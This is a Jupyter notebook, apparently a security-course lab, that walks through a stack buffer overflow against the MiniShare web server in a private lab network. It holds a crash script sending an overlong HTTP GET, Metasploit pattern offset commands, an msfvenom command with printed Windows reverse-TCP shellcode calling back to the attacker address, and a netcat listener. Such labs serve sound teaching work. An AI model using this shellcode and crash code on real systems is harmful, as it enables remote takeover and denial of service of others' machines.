{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Setup\n",
    "\n",
    "First let's confirm our network environment. In Windows XP you can run `ipconfig` to show the currently assigned IP address. In Linux you can run `ifconfig` to determine the currently assigned IP address. \n",
    "\n",
    "Use the following code blocks below to test your network setup."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The attacker machine's network configuration is:\n",
      "\n",
      "enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n",
      "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n",
      "        inet6 fe80::ca5d:b269:104d:5d10  prefixlen 64  scopeid 0x20<link>\n",
      "        ether 08:00:27:da:1b:be  txqueuelen 1000  (Ethernet)\n",
      "        RX packets 22746  bytes 28006827 (28.0 MB)\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\n",
      "        TX packets 5136  bytes 651113 (651.1 KB)\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n",
      "\n",
      "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n",
      "        inet 127.0.0.1  netmask 255.0.0.0\n",
      "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n",
      "        loop  txqueuelen 1000  (Local Loopback)\n",
      "        RX packets 8191  bytes 8701778 (8.7 MB)\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\n",
      "        TX packets 8191  bytes 8701778 (8.7 MB)\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "print \"The attacker machine's network configuration is:\\n\"\n",
    "stream = os.popen('ifconfig')\n",
    "print stream.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "attacker_address=\"172.16.189.134\" # TODO: set this to be the ATTACKER address printed in the above code block!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Target is OFFLINE. Check that MiniShare server is running!\n"
     ]
    }
   ],
   "source": [
    "target_address=\"172.16.189.136\" # TODO: set this to be your VICTIM IP\n",
    "target_port=80\n",
    "\n",
    "# use curl with timeout 3 seconds to check if target webserver is running\n",
    "# empty output means no error and target is alive\n",
    "from subprocess import PIPE, Popen\n",
    "def checkTargetAlive():\n",
    "    command = 'curl -sSf ' + target_address + \":\" + str(target_port) + ' --max-time 3 > /dev/null'\n",
    "    #print \"Running: \" + command\n",
    "    p = Popen(\"foo\", shell=True, stdout=PIPE, stderr=PIPE)\n",
    "    stdout, stderr = p.communicate()\n",
    "    if not stderr:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "        \n",
    "# call the checkTargetAlive() function\n",
    "if checkTargetAlive():\n",
    "    print \"Target is online\"\n",
    "else: \n",
    "    print \"Target is OFFLINE. Check that MiniShare server is running!\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your target is at IP: 172.16.189.136 on port 80\n",
      "Your attacker is at IP: 172.16.189.134\n"
     ]
    }
   ],
   "source": [
    "print \"Your target is at IP: \" + target_address + \" on port \" + str(target_port)\n",
    "print \"Your attacker is at IP: \" + attacker_address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exploit\n",
    "\n",
    "First make sure that you can successfully replicate the MiniShare program crash by sending a long string of `A` characters. If you have successfully crashed MiniShare try to replicate the crash again using OllyDBG to capture the program state when the crash is triggered. You can use the program block below to iteratively develop and test your exploit!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Target is OFFLINE. Check that MiniShare server is running!\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "import time\n",
    "\n",
    "if checkTargetAlive():\n",
    "    # send 'A' 2220 times as an HTTP GET request\n",
    "    buffer = \"GET \" + \"\\x41\" * 2220 + \" HTTP/1.1\\r\\n\\r\\n\"\n",
    "\n",
    "    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "    connect=sock.connect((target_address,target_port))\n",
    "    sock.send(buffer)\n",
    "    sock.close()\n",
    "    \n",
    "    # sleep 5 seconds\n",
    "    time.sleep(5)\n",
    "    \n",
    "    # check if we crashed MiniShare\n",
    "    if checkTargetAlive():\n",
    "        print \"Target is still online.\"\n",
    "    else: \n",
    "        print \"Target has been successfully crashed. We have a DoS attack!\"\n",
    "else: \n",
    "    print \"Target is OFFLINE. Check that MiniShare server is running!\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Hints\n",
    "You may find the following shell commands useful."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Generate a unique pattern of 2220 characters:\n",
      "\n",
      "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb --length=2220\n",
      "\n",
      "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print \"Generate a unique pattern of 2220 characters:\\n\"\n",
    "gen_pattern_command = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb --length=2220'\n",
    "print gen_pattern_command + '\\n'\n",
    "print os.popen(gen_pattern_command).read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Compute offsets for segment of unique pattern:\n",
      "\n",
      "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query=Ch7C\n",
      "\n",
      "[*] Exact match at offset 1791\n",
      "\n",
      "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query=36684335\n",
      "\n",
      "[*] Exact match at offset 1787\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print \"Compute offsets for segment of unique pattern:\\n\"\n",
    "\n",
    "compute_offset_command1 = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query=Ch7C'\n",
    "print compute_offset_command1 + '\\n'\n",
    "print os.popen(compute_offset_command1).read()\n",
    "\n",
    "compute_offset_command2 = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query=36684335'\n",
    "print compute_offset_command2 + '\\n'\n",
    "print os.popen(compute_offset_command2).read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Generate reverse TCP shell shellcode for Windows x86 with connection to attacker ip (172.16.189.134 on port 4444) and avoid bad characters relevant to strcpy.\n",
      "\n",
      "msfvenom -p windows/shell_reverse_tcp LHOST=172.16.189.134 LPORT=4444 --format=c --platform=windows --arch=x86 --bad-chars='\\x00\\x0a\\x0d'\n",
      "\n",
      "Found a database at /home/pac/.msf4/db, checking to see if it is started\n",
      "Starting database at /home/pac/.msf4/db...\u001b[1m\u001b[32msuccess\u001b[0m\u001b[0m\n",
      "\u001b[1m\u001b[34m[?]\u001b[0m\u001b[0m Initial MSF web service account username? [pac]: unsigned char buf[] = \n",
      "\"\\xd9\\xc3\\xd9\\x74\\x24\\xf4\\x5b\\x2b\\xc9\\xba\\xa7\\x88\\x6e\\xd7\\xb1\"\n",
      "\"\\x52\\x31\\x53\\x17\\x83\\xc3\\x04\\x03\\xf4\\x9b\\x8c\\x22\\x06\\x73\\xd2\"\n",
      "\"\\xcd\\xf6\\x84\\xb3\\x44\\x13\\xb5\\xf3\\x33\\x50\\xe6\\xc3\\x30\\x34\\x0b\"\n",
      "\"\\xaf\\x15\\xac\\x98\\xdd\\xb1\\xc3\\x29\\x6b\\xe4\\xea\\xaa\\xc0\\xd4\\x6d\"\n",
      "\"\\x29\\x1b\\x09\\x4d\\x10\\xd4\\x5c\\x8c\\x55\\x09\\xac\\xdc\\x0e\\x45\\x03\"\n",
      "\"\\xf0\\x3b\\x13\\x98\\x7b\\x77\\xb5\\x98\\x98\\xc0\\xb4\\x89\\x0f\\x5a\\xef\"\n",
      "\"\\x09\\xae\\x8f\\x9b\\x03\\xa8\\xcc\\xa6\\xda\\x43\\x26\\x5c\\xdd\\x85\\x76\"\n",
      "\"\\x9d\\x72\\xe8\\xb6\\x6c\\x8a\\x2d\\x70\\x8f\\xf9\\x47\\x82\\x32\\xfa\\x9c\"\n",
      "\"\\xf8\\xe8\\x8f\\x06\\x5a\\x7a\\x37\\xe2\\x5a\\xaf\\xae\\x61\\x50\\x04\\xa4\"\n",
      "\"\\x2d\\x75\\x9b\\x69\\x46\\x81\\x10\\x8c\\x88\\x03\\x62\\xab\\x0c\\x4f\\x30\"\n",
      "\"\\xd2\\x15\\x35\\x97\\xeb\\x45\\x96\\x48\\x4e\\x0e\\x3b\\x9c\\xe3\\x4d\\x54\"\n",
      "\"\\x51\\xce\\x6d\\xa4\\xfd\\x59\\x1e\\x96\\xa2\\xf1\\x88\\x9a\\x2b\\xdc\\x4f\"\n",
      "\"\\xdc\\x01\\x98\\xdf\\x23\\xaa\\xd9\\xf6\\xe7\\xfe\\x89\\x60\\xc1\\x7e\\x42\"\n",
      "\"\\x70\\xee\\xaa\\xc5\\x20\\x40\\x05\\xa6\\x90\\x20\\xf5\\x4e\\xfa\\xae\\x2a\"\n",
      "\"\\x6e\\x05\\x65\\x43\\x05\\xfc\\xee\\xc0\\xca\\x43\\x68\\x70\\xe9\\xbb\\x64\"\n",
      "\"\\xdd\\x64\\x5d\\xec\\xcd\\x20\\xf6\\x99\\x74\\x69\\x8c\\x38\\x78\\xa7\\xe9\"\n",
      "\"\\x7b\\xf2\\x44\\x0e\\x35\\xf3\\x21\\x1c\\xa2\\xf3\\x7f\\x7e\\x65\\x0b\\xaa\"\n",
      "\"\\x16\\xe9\\x9e\\x31\\xe6\\x64\\x83\\xed\\xb1\\x21\\x75\\xe4\\x57\\xdc\\x2c\"\n",
      "\"\\x5e\\x45\\x1d\\xa8\\x99\\xcd\\xfa\\x09\\x27\\xcc\\x8f\\x36\\x03\\xde\\x49\"\n",
      "\"\\xb6\\x0f\\x8a\\x05\\xe1\\xd9\\x64\\xe0\\x5b\\xa8\\xde\\xba\\x30\\x62\\xb6\"\n",
      "\"\\x3b\\x7b\\xb5\\xc0\\x43\\x56\\x43\\x2c\\xf5\\x0f\\x12\\x53\\x3a\\xd8\\x92\"\n",
      "\"\\x2c\\x26\\x78\\x5c\\xe7\\xe2\\x88\\x17\\xa5\\x43\\x01\\xfe\\x3c\\xd6\\x4c\"\n",
      "\"\\x01\\xeb\\x15\\x69\\x82\\x19\\xe6\\x8e\\x9a\\x68\\xe3\\xcb\\x1c\\x81\\x99\"\n",
      "\"\\x44\\xc9\\xa5\\x0e\\x64\\xd8\";\n",
      "\n"
     ]
    }
   ],
   "source": [
    "attacker_port = 4444\n",
    "print \"Generate reverse TCP shell shellcode for Windows x86 with connection to attacker ip (\" + attacker_address + \" on port \" + str(attacker_port) + \") and avoid bad characters relevant to strcpy.\\n\"\n",
    "\n",
    "generate_shellcode_command = \"msfvenom -p windows/shell_reverse_tcp LHOST=\" + attacker_address + \" LPORT=\" + str(attacker_port) + \" --format=c --platform=windows --arch=x86 --bad-chars='\\\\x00\\\\x0a\\\\x0d'\"\n",
    "print generate_shellcode_command + \"\\n\"\n",
    "print os.popen(generate_shellcode_command).read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Listen on attacker machine for target machine to connect back with shell.\n",
      "\n",
      "nc -nvvlp 4444\n",
      "\n",
      "Running listener! If exploit is sucessful you will see a Windows Command Prompt below when the shellcode executes.\n",
      "\n",
      "test\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print \"Listen on attacker machine for target machine to connect back with shell.\\n\"\n",
    "\n",
    "listener_command = \"nc -nvvlp \" + str(attacker_port)\n",
    "print listener_command + \"\\n\"\n",
    "\n",
    "# don't try to run the listen command in the notebook\n",
    "# without more advanced buffering I/O the output of the command\n",
    "# will not be visible until the network connection has terminated\n",
    "# instead you run this command in a new terminal window!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# References\n",
    "This particular vulnerability has been covered many sources online. If you get stuck try another approach!\n",
    "\n",
    "- Reference 1: [http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html](http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html)\n",
    "\n",
    "- Reference 2: [https://justpentest.blogspot.com/2015/07/minishare1.4.1-bufferoverflow.html](https://justpentest.blogspot.com/2015/07/minishare1.4.1-bufferoverflow.html)\n",
    "\n",
    "- Reference 3: [https://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win32-platform-part-9-writing-exploit-for-mini-share-software-1/](https://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win32-platform-part-9-writing-exploit-for-mini-share-software-1/)\n",
    "\n",
    "- Reference 4: [https://0xdeadcode.se/archives/178](https://0xdeadcode.se/archives/178)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.16"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
